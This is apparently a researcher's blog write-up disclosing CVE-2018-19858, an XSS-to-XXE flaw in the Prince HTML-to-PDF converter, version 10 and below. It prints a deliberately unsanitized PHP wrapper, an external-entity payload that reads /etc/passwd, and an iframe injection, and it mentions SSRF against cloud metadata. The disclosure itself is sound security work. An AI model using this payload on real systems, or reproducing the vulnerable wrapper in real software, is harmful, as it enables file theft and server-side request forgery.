---
source: corben-leo
source_url: https://corben.io/blog/18-12-5-XSS-to-XXE-in-Prince
title: "XSS to XXE in Prince v10 and below (CVE-2018-19858)"
description: "Leveraging an XSS to get XXE on Prince v10."
---

### Introduction:

This is a vulnerability I found while participating in a [bug-bounty program](https://en.wikipedia.org/wiki/Bug_bounty_program) earlier this year. It affects Prince, a software that converts "HTML, XHTML, or one of the many XML-based document formats" to PDF.

### Summary

Prince (versions 10 and below) is vulnerable to XML External Entities (XXE) due to the software processing XML with no protections against entities. This allows a remote attacker to gain file read, perform SSRF attacks, DOS, and more. This software is often used with a custom web wrapper that passes user-input into an HTML template which is then converted into a PDF.

Due to this, it will ocassionally require an XSS in the wrapper – no proper sanitization of user-input before passing it into the HTML template that's being converted.

### Exploitation:

Demo: `http://<server>/convert.php`


```
<?php
$binary = "/usr/local/bin/prince";
if($_SERVER['REQUEST_METHOD'] == 'POST') {
$content = $_POST['content'];
$file = "/tmp/doc.html";
$sf = fopen($file, 'w');
fwrite($sf, $content);
fclose($sf);
exec($binary." /tmp/doc.html -o out.pdf");
header('Location: /out.pdf');
} else {
echo '
<html>
<head>
<title>Convert</title>
<style>
textarea {
width: 500px;
height: 300px;
}
</style>
</head>
<body>
<textarea name="content" form="princeForm">Enter text here...</textarea>
<form method="POST" action="/convert.php" id="princeForm">
<input type="submit" value="Convert to PDF"></input>
</form>
</body>
</html>
';
}
?>
```


Host an XML file with the following contents:

```
<?xml version="1.0"?>
<!DOCTYPE cdl [<!ENTITY asd SYSTEM "file:///etc/passwd">]>
<cdl>&asd;</cdl>
```


Now give the converter the following HTML:

`<iframe src="http://<server>/xxe.xml">`


Prince will then **retrieve** the url in the SRC attribute in an attempt to display the iframe, **process** the XML we provide, and then render the result in the converted PDF document:

We can exploit this XXE to get full-read SSRF by giving it a SYSTEM entity with a **URL** instead, such as the AWS metadata server:

## Outro:

This issue was fixed in Prince version 11 and was assigned the following CVE: CVE-2018-19858.

There's another vulnerability affecting Prince versions 12 and below that I'll write-up soon as soon as it's patched.

Thanks for reading,

**Corben Leo**